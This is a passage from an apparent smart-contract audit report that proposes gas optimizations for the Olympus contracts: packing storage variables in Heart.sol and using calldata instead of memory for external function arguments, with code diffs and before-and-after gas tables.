┆ 323    ┆ 2323  ┆ 3       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ beat                                         ┆ 5429            ┆ 29228 ┆ 18552  ┆ 61386 ┆ 8       │ +│ beat                                         ┆ 5429            ┆ 28154 ┆ 17478  ┆ 59238 ┆ 8       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                        ┆ 24123           ┆ 24123 ┆ 24123  ┆ 24123 ┆ 11      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -397,7 +397,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                    ┆ 439             ┆ 439    ┆ 439    ┆ 439    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ operate                                     ┆ 387             ┆ 122263 ┆ 37958  ┆ 640609 ┆ 104     │ +│ operate                                     ┆ 387             ┆ 121697 ┆ 37958  ┆ 636406 ┆ 104     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ regenerate                                  ┆ 3772            ┆ 17622  ┆ 21791  ┆ 29292  ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -577,7 +577,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ getFee                                                                  ┆ 872             ┆ 3538   ┆ 4872   ┆ 4872   ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ purchase                                                                ┆ 228899          ┆ 239488 ┆ 239488 ┆ 250077 ┆ 2       │ +│ purchase                                                                ┆ 228739          ┆ 239261 ┆ 239261 ┆ 249783 ┆ 2       │  ╰─────────────────────────────────────────────────────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  ╭────────────────────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮  │ src/test/mocks/KernelTestMocks.sol:MockModule contract ┆                 ┆       ┆        ┆       ┆         │ ```   ### [G&#x2011;04]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/policies/Heart.sol  /// @audit Variable ordering with 5 slots instead of the current 6: ///           uint256(32):lastBeat, uint256(32):reward, user-defined(20):rewardToken, bool(1):active, address(20):PRICE, address(20):_operator 33:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33  ```diff diff --git a/src/policies/Heart.sol b/src/policies/Heart.sol index 7693dba..ced0bcb 100644 --- a/src/policies/Heart.sol +++ b/src/policies/Heart.sol @@ -29,9 +29,6 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      event RewardIssued(address to_, uint256 rewardAmount_);      event RewardUpdated(ERC20 token_, uint256 rewardAmount_);   -    /// @notice Status of the Heart, false = stopped, true = beating -    bool public active; -      /// @notice Timestamp of the last beat (UTC, in seconds)      uint256 public lastBeat;   @@ -41,6 +38,9 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      /// @notice Reward token address that users are sent for beating the Heart      ERC20 public rewardToken;   +    /// @notice Status of the Heart, false = stopped, true = beating +    bool public active; +      // Modules      OlympusPrice internal PRICE;  ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..9682b00 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -336,13 +336,13 @@  ╞══════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                              ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 934119                                       ┆ 4277            ┆       ┆        ┆       ┆         │ +│ 917440                                       ┆ 4309            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ active                                       ┆ 323             ┆ 989   ┆ 323    ┆ 2323  ┆ 3       │ +│ active                                       ┆ 340             ┆ 1006  ┆ 340    ┆ 2340  ┆ 3       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ beat                                         ┆ 5429            ┆ 29228 ┆ 18552  ┆ 61386 ┆ 8       │ +│ beat                                         ┆ 5443            ┆ 28492 ┆ 18566  ┆ 59400 ┆ 8       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                        ┆ 24123           ┆ 24123 ┆ 24123  ┆ 24123 ┆ 11      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -362,7 +362,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setRewardTokenAndAmount                      ┆ 8222            ┆ 13892 ┆ 13892  ┆ 19562 ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ toggleBeat                                   ┆ 1400            ┆ 7187  ┆ 8455   ┆ 10440 ┆ 4       │ +│ toggleBeat                                   ┆ 1427            ┆ 8416  ┆ 9577   ┆ 13083 ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ withdrawUnspentRewards                       ┆ 8201            ┆ 19621 ┆ 19621  ┆ 31041 ┆ 2       │  ╰──────────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ```   ### [G&#x2011;05]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved  *There are 5 instances of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit startObservations_ 205       function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 206           external 207:          permissioned  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L205-L207  ```solidity File: src/policies/BondCallback.sol  /// @audit tokens_ 152:      function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L152  ```solidity File: src/policies/Governance.sol  /// @audit proposalURI_ 159       function submitProposal( 160           Instruction[] calldata instructions_, 161           bytes32 title_, 162:          string memory proposalURI_  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159-L162  ```solidity File: src/policies/PriceConfig.sol  /// @audit startObservations_ 45        function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 46            external 47:           onlyRole("price_admin")  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45-L47  ```solidity File: src/policies/TreasuryCustodian.sol  /// @audit tokens_ 53:       function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53  ```diff diff --git a/src/modules/PRICE.sol b/src/modules/PRICE.sol index 55d85d3..5a620d7 100644 --- a/src/modules/PRICE.sol +++ b/src/modules/PRICE.sol @@ -202,7 +202,7 @@ contract OlympusPrice is Module {      /// @param  lastObservationTime_ - Unix timestamp of last observation being provided (in seconds).      /// @dev    This function must be called after the Price module is deployed to activate it and after updating the observationFrequency      ///         or movingAverageDuration (in certain cases) in order for the Price module to function properly. -    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) +    function initialize(uint256[] calldata startObservations_, uint48 lastObservationTime_)          external          permissioned      { diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..902bcfc 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -149,7 +149,7 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {        /// @notice Send tokens to the TRSRY in a batch      /// @param  tokens_ - Array of tokens to send -    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { +    function batchToTreasury(ERC20[] calldata tokens_) external onlyRole("callback_admin") {          ERC20 token;          uint256 balance;          uint256 len = tokens_.length; diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..a39dad0 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -159,7 +159,7 @@ contract OlympusGovernance is Policy {      function submitProposal(          Instruction[] calldata instructions_,          bytes32 title_, -        string memory proposalURI_ +        string calldata proposalURI_      ) external {          if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)              revert NotEnoughVotesToPropose(); diff --git a/src/policies/PriceConfig.sol b/src/policies/PriceConfig.sol index 78887fd..214e0ab 100644 --- a/src/policies/PriceConfig.sol +++ b/src/policies/PriceConfig.sol @@ -42,7 +42,7 @@ contract OlympusPriceConfig is Policy {      /// @param lastObservationTime_ Unix timestamp of last observation being provided (in seconds).      /// @dev This function must be called after the Price module is deployed to activate it and after updating the observationFrequency      ///      or movingAverageDuration (in certain cases) in order for the Price module to function properly. -    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) +    function initialize(uint256[] calldata startObservations_, uint48 lastObservationTime_)          external          onlyRole("price_admin")      { diff --git a/src/policies/TreasuryCustodian.sol b/src/policies/TreasuryCustodian.sol index 1c12f2e..a240cd1 100644 --- a/src/policies/TreasuryCustodian.sol +++ b/src/policies/TreasuryCustodian.sol @@ -50,7 +50,7 @@ contract TreasuryCustodian is Policy {      // Anyone can call to revoke a deactivated policy's approvals.      // TODO Currently allows anyone to revoke any approval EXCEPT activated policies.      // TODO must reorg policy storage to be able to check for deactivated policies. -    function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external { +    function revokePolicyApprovals(address policy_, ERC20[] calldata tokens_) external {          if (Policy(policy_).isActive()) revert PolicyStillActive();            // TODO Make sure `policy_` is an actual policy and not a random address.  ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..513078c 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -108,7 +108,7 @@  ╞═════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                             ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1117743                                     ┆ 6851            ┆        ┆        ┆        ┆         │ +│ 1101930                                     ┆ 6772            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                               ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -128,7 +128,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ getMovingAverage                            ┆ 544             ┆ 812    ┆ 544    ┆ 2420   ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ initialize                                  ┆ 4063            ┆ 432495 ┆ 512316 ┆ 886622 ┆ 24      │ +│ initialize                                  ┆ 2327            ┆ 430562 ┆ 510516 ┆ 883159 ┆ 24      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ initialized                                 ┆ 340             ┆ 955    ┆ 340    ┆ 2340   ┆ 13      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -258,7 +258,7 @@  ╞═════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪════════╪═════════╡  │ Deployment Cost                                     ┆ Deployment Size ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1408325                                             ┆ 6934            ┆       ┆        ┆        ┆         │ +│ 1386305                                             ┆ 6824            ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                       ┆ min             ┆ avg   ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -266,7 +266,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ approvedMarkets                                     ┆ 685             ┆ 685   ┆ 685    ┆ 685    ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ batchToTreasury                                     ┆ 4111            ┆ 12729 ┆ 12068  ┆ 22668  ┆ 4       │ +│ batchToTreasury                                     ┆ 3800            ┆ 12543 ┆ 11920  ┆ 22533  ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ callback                                            ┆ 7678            ┆ 98980 ┆ 85627  ┆ 187927 ┆ 17      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -289,7 +289,7 @@  ╞════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                        ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1638243                                                ┆ 8250            ┆        ┆        ┆        ┆         │ +│ 1645850                                                ┆ 8288            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -317,7 +317,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setActiveStatus                                        ┆ 777             ┆ 1228   ┆ 777    ┆ 3577   ┆ 31      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ submitProposal                                         ┆ 11529           ┆ 176506 ┆ 187247 ┆ 187247 ┆ 25      │ +│ submitProposal                                         ┆ 11364           ┆ 176510 ┆ 187258 ┆ 187258 ┆ 25      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ tokenClaimsForProposal                                 ┆ 684             ┆ 684    ┆ 684    ┆ 684    ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -430,7 +430,7 @@  ╞══════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                          ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 639600                                                   ┆ 3262            ┆        ┆        ┆        ┆         │ +│ 620181                                                   ┆ 3165            ┆        ┆        